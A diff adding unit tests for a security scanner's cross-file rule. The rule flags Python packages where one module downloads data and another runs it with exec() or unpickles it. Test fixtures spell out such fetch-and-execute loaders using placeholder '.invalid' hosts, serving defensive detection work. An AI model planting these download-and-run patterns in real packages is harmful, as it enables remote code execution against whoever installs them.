@@ -416,5 +416,124 @@ class SubstitutedDownloadTests(unittest.TestCase):
                          ["pipes a download into a shell"])
 
 
+SP = "venv/lib/python3.12/site-packages/"
+
+
+def _pkgfiles(mapping):
+    """{package-relative path: content} -> dependency file dicts under a
+    site-packages prefix (what dependency_checks / the follower see)."""
+    return [{"path": SP + rel, "content": c, "lang": "py", "dep": True} for rel, c in mapping.items()]
+
+
+class CrossFileReceivedTests(unittest.TestCase):
+    """The Python-only cross-file follower: a value received in one file of a
+    package and run in another (_cross_file_received_issues). Inert text only:
+    hosts are .invalid."""
+
+    def test_tainted_exports_are_found(self):
+        # a function that returns a received value (direct, and via a local)
+        self.assertEqual(core._xf_tainted_exports(
+            "import requests\ndef pull():\n    return requests.get(" + U + ").text\n"), frozenset({"pull"}))
+        self.assertEqual(core._xf_tainted_exports(
+            "import requests\ndef pull():\n    r = requests.get(" + U + ")\n    return r.text\n"),
+            frozenset({"pull"}))
+        # a module-level name that holds a received value
+        self.assertEqual(core._xf_tainted_exports(
+            "import urllib.request\nPAYLOAD = urllib.request.urlopen(" + U + ").read().decode()\n"),
+            frozenset({"PAYLOAD"}))
+        # nothing received: no export (and the network-needle gate returns early)
+        self.assertEqual(core._xf_tainted_exports("def greeting():\n    return 'hello'\n"), frozenset())
+        self.assertEqual(core._xf_tainted_exports(
+            "import requests\ndef ping():\n    requests.get(" + U + ")\n    return 'ok'\n"), frozenset())
+
+    def _one(self, files, skip=()):
+        issues = core._cross_file_received_issues(files, skip)
+        return [(i["rule"], i["sev"], i["file"].replace("\\", "/"), i["msg"]) for i in issues]
+
+    def test_run_across_files_fires(self):
+        for label, src_mod, sink in [
+            ("callable", "xdrop/_net.py",
+             {"xdrop/__init__.py": "from ._net import pull\nexec(pull())\n",
+              "xdrop/_net.py": "import requests\ndef pull():\n    return requests.get(" + U + ").text\n"}),
+            ("value", "xdrop2/cfg.py",
+             {"xdrop2/__init__.py": "from .cfg import PAYLOAD\nexec(PAYLOAD)\n",
+              "xdrop2/cfg.py": "import urllib.request\nPAYLOAD = urllib.request.urlopen(" + U + ").read().decode()\n"}),
+            ("absolute import", "pkg/net.py",
+             {"pkg/__init__.py": "from pkg.net import pull\nexec(pull())\n",
+              "pkg/net.py": "import requests\ndef pull():\n    return requests.get(" + U + ").text\n"}),
+            ("multi-line source", "xm/src.py",
+             {"xm/__init__.py": "from .src import pull\nexec(pull())\n",
+              "xm/src.py": "import requests\ndef pull():\n    r = requests.get(" + U + ")\n    return r.text\n"}),
+        ]:
+            with self.subTest(label):
+                got = self._one(_pkgfiles(sink))
+                self.assertEqual(len(got), 1, got)
+                rule, sev, _f, msg = got[0]
+                self.assertEqual((rule, sev), ("SC-IMPORT-RISK", "MAJOR"))
+                self.assertIn(REASON, msg)
+                self.assertIn(src_mod.replace("/", ".")[:-3], msg)   # names the source module
+
+    def test_deserialize_across_files_keeps_its_reason(self):
+        got = self._one(_pkgfiles({
+            "d/__init__.py": "from .cfg import BLOB\nimport pickle\npickle.loads(BLOB)\n",
+            "d/cfg.py": "import requests\nBLOB = requests.get(" + U + ").content\n"}))
+        self.assertEqual(len(got), 1, got)
+        self.assertIn("deserializes data it receives over the network", got[0][3])
+
+    def test_what_does_not_fire_across_files(self):
+        # an imported name that is not run
+        self.assertEqual(self._one(_pkgfiles({
+            "b/__init__.py": "from .util import greeting\nprint(greeting())\n",
+            "b/util.py": "def greeting():\n    return 'hello'\n"})), [])
+        # cross-package: separate packages are separate groups, never joined
+        self.assertEqual(self._one(_pkgfiles({
+            "pa/__init__.py": "from pb.net import pull\nexec(pull())\n",
+            "pa/util.py": "x = 1\n",
+            "pb/__init__.py": "x = 1\n",
+            "pb/net.py": "import requests\ndef pull():\n    return requests.get(" + U + ").text\n"})), [])
+        # a lone file is never a cross-file finding
+        self.assertEqual(self._one(_pkgfiles({
+            "solo/__init__.py": "from .gone import pull\nexec(pull())\n"})), [])
+        # a file already flagged single-file is skipped (no duplicate)
+        files = _pkgfiles({
+            "s/__init__.py": "import requests\nfrom .x import pull\nexec(requests.get(" + U + ").text)\n",
+            "s/x.py": "import requests\ndef pull():\n    return requests.get(" + U + ").text\n"})
+        self.assertEqual(self._one(files, skip={SP + "s/__init__.py"}), [])
+
+    def test_end_to_end_scan_flags_cross_file(self):
+        import os
+        import tempfile
+        files = {
+            "package.json": '{"name":"app","version":"1.0.0"}',
+            "venv/pyvenv.cfg": "home = /usr\n",
+            SP + "xdrop/__init__.py": "from ._net import pull\nexec(pull())\n",
+            SP + "xdrop/_net.py": "import requests\ndef pull():\n    return requests.get(" + U + ").text\n",
+        }
+        with tempfile.TemporaryDirectory() as root:
+            for rel, data in files.items():
+                path = os.path.join(root, *rel.split("/"))
+                os.makedirs(os.path.dirname(path), exist_ok=True)
+                with open(path, "w", encoding="utf-8") as f:
+                    f.write(data)
+            res = core.scan_project(root, include_deps=True)
+        xf = [i for i in res["issues"] if i["rule"] == "SC-IMPORT-RISK"
+              and "another file of the package" in i["msg"]]
+        self.assertEqual(len(xf), 1, [i["msg"] for i in res["issues"] if i["rule"] == "SC-IMPORT-RISK"])
+        self.assertEqual(xf[0]["sev"], "MAJOR")
+        self.assertTrue(xf[0]["file"].replace("\\", "/").endswith("xdrop/__init__.py"))
+
+    def test_bounded(self):
+        # a big package must not blow up: many modules, one real cross-file drop
+        pkg = {f"big/m{i}.py": "import requests\ndef f{}():\n    return requests.get(u).text\n".format(i)
+               for i in range(1500)}
+        pkg["big/__init__.py"] = "from .m0 import f0\nexec(f0())\n"
+        pkg["big/m0.py"] = "import requests\ndef f0():\n    return requests.get(" + U + ").text\n"
+        start = time.monotonic()
+        got = core._cross_file_received_issues(_pkgfiles(pkg))
+        self.assertLess(time.monotonic() - start, 15)
+        self.assertTrue(any("another file of the package" in msg for *_r, msg in
+                            [(i["rule"], i["msg"]) for i in got]))
+
+
 if __name__ == "__main__":
     unittest.main()
